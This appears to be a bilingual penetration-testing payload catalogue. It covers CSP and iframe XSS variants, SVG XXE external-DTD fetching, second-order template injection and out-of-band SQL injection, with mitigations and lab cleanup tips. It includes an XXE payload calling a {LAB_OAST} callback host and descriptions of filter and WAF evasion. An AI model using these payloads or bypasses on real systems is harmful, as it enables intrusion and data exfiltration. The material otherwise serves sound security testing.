prerequisites.en: The effective CSP, frame-src or child-src, and script-src decisions are observable.

analysis.zh: 分别报告 form javascript、srcdoc、明文 data 和 Base64 data 的加载与执行结果、origin 和 CSP 指令。四行共享主题但不是同一浏览器机制。
analysis.en: Report load and execution, origin, and governing CSP directive separately for javascript forms, srcdoc, plain data, and Base64 data. They share a theme but not one browser mechanism.

opsecTips.zh: 所有 alert 改为内存标记，不读取 Cookie、存储或父文档敏感数据。
opsecTips.en: Replace every alert with an in-memory marker and do not read cookies, storage, or sensitive parent data.

opsecTips.zh: 每个模式使用全新浏览器上下文并关闭共享缓存，结束后销毁。
opsecTips.en: Use a fresh browser context without shared cache for each pattern and destroy it afterward.

description.zh: 绕过 srcdoc 内明文脚本检测：内容实体化。判据：iframe 渲染执行。
description.en: Entity-encodes srcdoc content. Success: executes inside the frame.

description.zh: 绕过 src 白名单/内容检测：base64 文档。判据：执行弹窗。
description.en: Base64 data: document in the frame. Success: alert fires.

description.zh: 绕过 input 提交特征：按钮触发动作。判据：点击执行。
description.en: Button submit triggers the javascript: action. Success: alert on click.

description.zh: 绕过 iframe src 过滤：object 的 data 属性同样可执行。判据：弹窗。
description.en: object data attribute replaces iframe src. Success: alert.

name.zh: SVG 外部参数实体 DTD 获取

description.zh: 隔离远程参数实体变体，验证 SVG worker 是否获取外部 DTD。
description.en: Isolates the remote parameter-entity variant to test whether the SVG worker retrieves an external DTD.

subCategory.zh: 外部 DTD 载体获取

overview.zh: 覆盖 SVG worker 的外部 DTD 获取验证：以 SVG 中的外部参数实体拉取 DTD，{LAB_OAST} 收到单次请求即确认获取边界。用于确认图片处理链是否允许外部子集加载。
overview.en: Covers external DTD fetch verification in SVG workers: pulling a DTD via an external parameter entity in the SVG, with {LAB_OAST} receiving a single request confirming the fetch boundary. Used to determine whether the image-processing chain allows external subset loading.

vulnerability.zh: 根因是 SVG worker 继承网络权限且解析器允许外部参数实体拉取 DTD；外部加载是参数实体外带链的前置能力，端点只返回空合法 DTD 以证明获取行为本身。
vulnerability.en: The root cause is SVG workers inheriting network privileges with parsers allowing external parameter entities to pull DTDs; external loading is the precursor capability for parameter-entity exfiltration chains, and the endpoint returns only an empty valid DTD to prove the fetch itself.

exploitation.zh: 使用第 1 步命令以 SVG 中的外部参数实体拉取 DTD，{LAB_OAST} 渲染为只返回空合法 DTD 的单次 token 端点；收到单次 DTD 请求即确认 SVG 外部参数实体 DTD 获取边界。先上传合法 SVG 记录任务基线，再触发预览或转码并按 token 关联请求。重复触发一次任务确认请求稳定，排除偶发缓存命中。
exploitation.en: Use the step 1 command to pull a DTD via an external parameter entity in the SVG, with {LAB_OAST} rendered as a single-token endpoint returning only an empty valid DTD; receiving the single DTD request confirms the SVG external-parameter-entity fetch boundary. Baseline with a legitimate SVG upload first, then trigger preview or conversion and correlate requests by token. Re-trigger one task confirming request stability, excluding sporadic cache hits.

mitigation.zh: SVG 解析器禁用外部 DTD 子集与参数实体，worker 出站默认拒绝；修复后重放应报禁止错误且监听端无请求。
mitigation.en: Disable external DTD subsets and parameter entities in SVG parsers with worker egress default-denied; after the fix, replays must raise forbidden errors with zero listener requests.

title.zh: 确认 SVG 后端解析器

description.zh: 记录上传任务、worker、版本和无外部资源基线。
description.en: Record the upload job, worker, version, and no-external-resource baseline.

title.zh: 改写目标并触发单一机制
title.en: Rewrite targets and trigger one mechanism

description.zh: 只提交本条执行区变体，并把真实目标替换为隔离 marker。
description.en: Submit only this execution variant and replace real destinations with isolated markers.

attackChain.payload: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY % xxe SYSTEM "http://{LAB_OAST}/xxe.dtd">%xxe;]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">test</text></svg>

title.zh: 关联 Worker 与派生产物
title.en: Correlate the worker and derived artifact

description.zh: 匹配任务 token、解析器事件和缩略图或文本结果，排除客户端解析。
description.en: Match job token, parser events, and thumbnail or text output and exclude client parsing.

description.zh: 修复后普通 SVG 仍可栅格化，该机制在访问 marker 前失败。
description.en: After remediation ordinary SVG still rasterizes and this mechanism fails before marker access.

prerequisites.zh: 上传后的 SVG 会由服务端尺寸读取、预览或栅格化 worker 解析 XML，而不是仅静态存储或客户端浏览。
prerequisites.en: Uploaded SVG is parsed as XML by a server-side dimension, preview, or rasterization worker rather than stored statically or viewed only client-side.

prerequisites.zh: 测试 SVG 的实体只引用 worker 沙箱内固定 marker，异步任务保存上传 ID、worker PID、文件审计和生成图像/OCR 文本。
prerequisites.en: The test SVG entity references only a fixed marker inside the worker sandbox, with upload identifier, worker PID, file audit, and generated image or OCR text preserved for the asynchronous job.

analysis.zh: 阳性要求 DTD token 请求由处理该上传的图片 worker 发出；DNS、客户端请求、任务失败或 ATTACKER 回显均不计。
analysis.en: A positive requires the DTD token request to originate from the image worker processing this upload; DNS, client requests, job failure, or reflected ATTACKER text does not count.

opsecTips.zh: SVG 上传 XXE 只读 worker 沙箱 marker；出现主机真实文件访问、外连、处理队列积压、图像炸弹行为或 worker 重启时停止。
opsecTips.en: SVG upload XXE reads only a worker-sandbox marker; stop on real host-file access, egress, processing backlog, image-bomb behavior, or worker restarts.

opsecTips.zh: 删除上传 SVG、marker、临时解包/栅格文件和预览，清理对象存储/任务队列/图像缓存并重启 worker。
opsecTips.en: Delete uploaded SVGs, markers, temporary extraction or raster files, and previews, clear object storage, job queues, and image caches, and restart workers.

description.zh: 不用 DOCTYPE，经 image xlink:href 拉取外部资源，规避实体声明检测；成功判据：OAST 收到 dtd.svg 请求。
description.en: Drops DOCTYPE and fetches via image xlink:href to evade entity-declaration detection. Success: OAST receives the dtd.svg request.

title.zh: 大写 HTTP 参数实体变体

description.zh: 协议大写规避小写 http 特征；成功判据：外部 DTD 请求到达。
description.en: Uppercase scheme evades lowercase http signatures. Success: the external DTD request arrives.

wafBypass.command:
<?xml version="1.0"?><!DOCTYPE svg [
<!ENTITY % dtd ref SYSTEM ignored="x">]><svg xmlns="http://www.w3.org/2000/svg"><desc>broken</desc></svg>

description.zh: 构造畸形声明探测解析器容错差异，定位过滤边界（条件性前置探针）；成功判据：畸形输入与正常输入报错差异可区分过滤行为。
description.en: A malformed declaration probes parser tolerance to map the filter boundary (conditional pre-probe). Success: error responses differ between malformed and well-formed input, revealing the filter.

name.zh: 二阶 Template Toolkit 算术求值

description.zh: 验证存储值是否在后续任务中被 Template Toolkit 风格的 `[% ... %]` 语法重新编译，并以无副作用算术结果证明服务端求值。
description.en: Tests whether a stored value is later recompiled with Template Toolkit-style [% ... %] syntax and proves server-side evaluation through a side-effect-free arithmetic result.

overview.zh: 覆盖 Template Toolkit 的二阶模板求值验证：把 [% ... %] 常量算术表达式存入存储字段，后续受控渲染任务的服务端产物出现 49 才计为阳性。用于区分字面回显与模板执行。
overview.en: Covers second-order template evaluation verification for Template Toolkit: storing a constant-arithmetic [% ... %] expression in a persisted field, counted positive only when the server-side artifact of a later controlled render task shows 49. Used to separate literal echo from template execution.

vulnerability.zh: 根因是应用把数据库字段或消息正文拼成模板源码并再次调用 process/compile，原本的数据进入模板语法边界；若上下文暴露敏感对象，影响会超过算术求值。
vulnerability.en: The root cause is the application composing database fields or message bodies into template source and calling process/compile again, moving data across the template-syntax boundary; with sensitive objects in context, impact exceeds arithmetic evaluation.

exploitation.zh: 使用第 1 步命令先存储该单一表达式，再触发一次受控渲染任务；只有同一任务的服务端产物出现 49 才计为阳性。先写入随机纯文本记录任务 ID 建立对照，再写入表达式并关联写入记录、队列消息、模板日志与产物输出，用未渲染字段排除字面回显。
exploitation.en: Use the step 1 command to store the single expression first, then trigger one controlled render task; only 49 in the same task's server-side artifact counts as positive. Baseline with random plain text recording the task ID, then store the expression and correlate write records, queue messages, template logs, and artifact output, excluding literal echo via unrendered fields.

mitigation.zh: 固定服务端模板并把存储值作为数据变量传入，禁止动态编译用户字段；最小化上下文并启用沙箱，为所有异步渲染路径添加字面输出回归测试。
mitigation.en: Pin server-side templates and pass stored values as data variables, forbidding dynamic compilation of user fields; minimize context and enable sandboxing, adding literal-output regressions across all async render paths.

title.en: Bind the write to the job

description.zh: 使用随机记录和任务 ID 关联写入、队列与最终产物。
description.en: Use random record and job identifiers to correlate storage, queue processing, and the final artifact.

description.zh: 只使用本条执行区输入并触发一次受控渲染。
description.en: Use only this execution input and trigger one controlled render.

description.zh: 要求同一任务的模板日志与产物共同证明结果 49。
description.en: Require the same job's template log and artifact to jointly prove the value 49.

description.zh: 修复后表达式按文本输出，普通业务变量保持可用。
description.en: After remediation the expression is rendered literally while ordinary business variables remain functional.

prerequisites.zh: 已确认后续邮件、报表或任务使用 Template Toolkit 兼容语法重新编译存储字段，而不是把字段作为普通变量输出。
prerequisites.en: A later mail, report, or background job is confirmed to recompile the stored field with Template Toolkit-compatible syntax rather than output it as an ordinary variable.

prerequisites.zh: 准备合成记录、随机任务标识、纯文本对照和渲染日志，测试表达式只计算常量且不访问对象、文件或网络。
prerequisites.en: Prepare a synthetic record, random job identifier, plain-text control, and render logs, with the test expression limited to constant arithmetic and no object, file, or network access.

analysis.zh: 阳性要求同一存储 token 在后续 Template Toolkit 任务中产生 49，并与服务端编译日志关联；写入成功、字面字符串、浏览器计算或手工复制到模板编辑器都不是二阶求值。
analysis.en: A positive requires the same stored token to produce 49 in a later Template Toolkit job with correlated server compilation logs; successful storage, a literal string, browser computation, or manual copying into an editor is not second-order evaluation.

opsecTips.zh: 只运行常量算术，出现对象访问、文件/网络动作、真实邮件发送或 worker 异常时立即停止。
opsecTips.en: Run constant arithmetic only and stop on object access, file or network activity, real mail delivery, or worker anomalies.

opsecTips.zh: 删除合成记录与生成产物，清空队列和模板缓存，再用普通变量回归。
opsecTips.en: Delete synthetic records and generated artifacts, clear queues and template caches, and regress with ordinary variables.

description.zh: 开启 PERL 时直接执行。判据：uid 输出。
description.en: Direct execution when PERL is enabled. Success: uid output.

description.zh: 赋值输出两段式绕过整体匹配。判据：输出 49。
description.en: Two-stage assign/print. Success: prints 49.

description.zh: 横线空白控制改变定界符形态。判据：仍输出 49。
description.en: Whitespace control alters delimiters. Success: still prints 49.

description.zh: TRY 块包裹绕过外层过滤。判据：输出 49。
description.en: Wrapping in TRY. Success: prints 49.

name.zh: 二阶花括号类型强制求值

description.zh: 使用加、减、乘三个无副作用常量表达式观察目标花括号模板的字符串与数字强制语义，前提是已识别实际服务端引擎。
description.en: Uses three side-effect-free constant expressions to observe string and numeric coercion in the identified server-side brace template engine.

overview.zh: 覆盖花括号模板的类型强制语义验证：以加、减、乘三个无副作用常量表达式观察目标引擎的字符串连接与数值运算差异。前提是已识别实际服务端引擎。
overview.en: Covers type-coercion semantics verification for brace templates: three side-effect-free constant expressions (add, subtract, multiply) observing the target engine's string-concatenation versus numeric-operation differences. Preconditions: the actual server engine is already identified.

vulnerability.zh: 根因是存储字段被重新编译为模板源码，常量表达式在后续服务端任务中按引擎类型规则求值；不同引擎对 + 的字符串/数字语义不同，可作指纹。
vulnerability.en: The root cause is stored fields recompiled as template source, so constant expressions evaluate under the engine's type rules in later server-side tasks; differing string/numeric semantics of + across engines serve as a fingerprint.

exploitation.zh: 使用第 1 步命令按顺序逐条存储并单独触发任务，比较字符串连接、数值减法和数值乘法的服务端输出；不要批量提交。对每一行分别建立记录与任务 ID，关联预期输出与模板日志，用普通字符串和未渲染字段作对照。
exploitation.en: Use the step 1 command to store each expression in order and trigger tasks individually, comparing server output across string concatenation, numeric subtraction, and numeric multiplication; never submit in bulk. Create separate records and task IDs per line, correlating expected outputs with template logs, using plain strings and unrendered fields as controls.

mitigation.zh: 禁止动态编译存储字段，固定模板、收窄上下文并把用户值编码为普通数据；对类型强制探测建立日志告警与回归。
mitigation.en: Forbid dynamic compilation of stored fields; pin templates, narrow context, and encode user values as plain data, with log alerting and regressions over type-coercion probes.

description.zh: 在同版本模板夹具记录三个表达式的预期输出。
description.en: Record expected output for all three expressions in a same-version template fixture.

title.en: Trigger second-order jobs one by one

description.zh: 每次只选择本执行区的一行并绑定独立任务 ID。
description.en: Select one line from this execution entry per run and bind a unique job identifier.

description.zh: 关联任务日志与连接、减法、乘法结果，排除前端处理。
description.en: Correlate job logs with concatenation, subtraction, and multiplication results while excluding client processing.

description.zh: 修复后所有表达式按文本输出且业务模板保持正常。
description.en: After remediation every expression is rendered literally while business templates remain functional.

prerequisites.zh: 已识别具体服务端花括号模板引擎，并确认这三种表达式在该版本属于模板语法而不是字面文本。
prerequisites.en: The exact server-side brace template engine is identified and these expressions are confirmed as template syntax for that version rather than literal text.

prerequisites.zh: 先在离线模板夹具记录预期输出，再用合成存储记录和单次异步任务复现。
prerequisites.en: Record expected output in an offline template fixture before reproducing it with a synthetic stored record and one asynchronous job.

analysis.zh: 阳性要求每个存储 token 在独立后续任务中产生与离线同版本引擎一致的类型强制结果；单次回显、JavaScript 运算或错误消息不能证明。
analysis.en: A positive requires each stored token to produce the same coercion result as the offline same-version engine in a separate later job; one reflection, JavaScript computation, or error message does not prove it.

opsecTips.zh: 每轮只测试一行常量表达式并限制一个合成记录，避免队列与缓存互相污染。
opsecTips.en: Test one constant expression and one synthetic record per run to avoid queue and cache contamination.

opsecTips.zh: 完成后删除三条记录及其产物，清空模板缓存并终止测试 worker。
opsecTips.en: Delete all three records and artifacts, clear template caches, and stop the test worker afterward.

description.zh: 减法在弱类型引擎返回 0 或 NaN 可分辨实现。判据：非空求值即注入点存在。
description.en: Weak typing yields 0/NaN depending on engine. Success: any evaluation proves injection.

description.zh: 对调操作数区分隐式转换方向。判据：得到 77 或 14 类结果。
description.en: Operand order distinguishes coercion direction. Success: yields 77- or 14-style result.

description.zh: ** 仅部分引擎支持，语法错误即排除。判据：输出 823543 定 Python 系。
description.en: Only some engines support **. Success: 823543 pins the Python family.

description.zh: // 为 Python 特有运算符。判据：输出 1 即 Python 模板。
description.en: // is Python-specific. Success: 1 identifies a Python engine.

name.zh: 数据库带外网络解析注入

description.zh: 按 Oracle、MySQL、SQL Server 和 PostgreSQL 方言触发受控 DNS、HTTP、LDAP 或文件共享访问，用于确认盲 SQL 注入与数据库出站能力。
description.en: Uses Oracle, MySQL, SQL Server, and PostgreSQL-specific network primitives to trigger controlled DNS, HTTP, LDAP, or file-share access for blind SQL injection validation.

overview.zh: 覆盖数据库带外网络解析注入验证：按 Oracle、MySQL、SQL Server 与 PostgreSQL 方言触发受控 DNS、HTTP、LDAP 或文件共享访问，确认盲 SQL 注入与数据库出站能力。
overview.en: Covers database out-of-band network-resolution injection: triggering controlled DNS, HTTP, LDAP, or file-share access per Oracle, MySQL, SQL Server, and PostgreSQL dialects, confirming blind SQL injection and database egress capability.

vulnerability.zh: 根因是不可信输入被拼接为 SQL 且数据库账户仍可调用网络、文件或目录扩展函数并允许出站访问；不同产品函数与权限差异很大，错误方言通常只产生语法错误。
vulnerability.en: The root cause is untrusted input concatenated into SQL while database accounts can still invoke network, file, or directory extension functions with egress allowed; product functions and privileges vary widely, and a wrong dialect usually yields only syntax errors.

exploitation.zh: 使用第 1 步命令仅选择与已确认数据库方言匹配的行提交出站请求（HTTP/UNC/LDAP/COPY）；自有回连域名的 DNS 解析或请求日志出现对应记录即确认数据库带外解析通道成立。{LAB_OAST} 渲染为带外验证域名，每次请求使用唯一子域便于关联。先经错误特征确认数据库类型，再关联应用请求、数据库审计、DNS/HTTP 监听与源地址。
exploitation.en: Use the step 1 command to submit outbound requests (HTTP/UNC/LDAP/COPY) using only rows matching the confirmed database dialect; DNS resolution or request logs against your callback domain confirming the record establish the database OOB resolution channel. Render {LAB_OAST} as the OOB verification domain with a unique subdomain per request for correlation. Confirm the database type via error signatures first, then correlate application requests, database audit, DNS/HTTP listeners, and source addresses.

mitigation.zh: 使用参数化查询并禁止动态 SQL 片段；移除数据库账户不需要的网络、文件与扩展过程权限，在网络层阻断数据库出站并审计相关函数调用；修复后重放正常查询、注入样例与唯一回连控制。
mitigation.en: Parameterize queries and forbid dynamic SQL fragments; revoke unneeded network, file, and extension-procedure privileges from database accounts, blocking database egress at the network layer with audits over related function calls; after the fix, replay normal queries, injection samples, and unique-callback controls.

title.zh: 确认数据库方言与权限

description.zh: 从资产、错误和审计信息确认数据库产品，只选择相符且副作用最小的网络函数。
description.en: Use asset, error, and audit data to identify the database and select only a matching low-impact network primitive.

description.zh: 将示例域替换为一次性自有子域，逐条提交并记录请求 ID 与精确时间。
description.en: Replace the example domain with a one-time controlled subdomain, submit one line, and record request ID and exact time.

description.zh: 匹配唯一标签、源地址、数据库函数审计和请求时间，并用无网络控制表达式排除应用层请求。
description.en: Match unique label, source, database-function audit, and request timing, and use a no-network control expression to exclude application-tier traffic.

description.zh: 修复查询和数据库权限后重放样例，确认正常业务查询保留且不再产生回连。
description.en: After query and privilege remediation, replay samples to preserve valid queries without callbacks.

prerequisites.zh: 输入可能进入数据库字符串或表达式上下文
prerequisites.en: Input may enter a database string or expression context.

prerequisites.zh: 隔离环境提供唯一受控 DNS/HTTP 回连域并允许审计数据库出站
prerequisites.en: An isolated environment provides a unique controlled callback domain and auditable database egress.

analysis.zh: 带外通道只证明网络请求来源时还不够；应将其绑定到具体 SQL 函数执行、数据库主体和应用输入，才能排除应用服务器自身请求。
analysis.en: A callback source alone is insufficient. Bind it to a specific SQL function, database principal, and application input to exclude requests made by the application tier.

opsecTips.zh: 唯一域名只编码随机请求 ID，不放入表名、用户名或真实数据。
opsecTips.en: Encode only a random request ID in callback domains, never table names, usernames, or real data.

opsecTips.zh: 每个目标只尝试已确认方言的一条低影响函数，并设置监听过期时间。
opsecTips.en: Try one low-impact primitive for the confirmed dialect per target and expire callback listeners promptly.

description.zh: 绕过对 HTTP 出网函数族的拦截：MSSQL 用目录枚举原语触发 UNC 解析出网；{LAB_OAST} 收到 SMB/DNS 查询即成功。
description.en: Trigger UNC resolution via the directory-enumeration primitive when HTTP egress functions are blocked; an SMB/DNS hit on {LAB_OAST} confirms success.
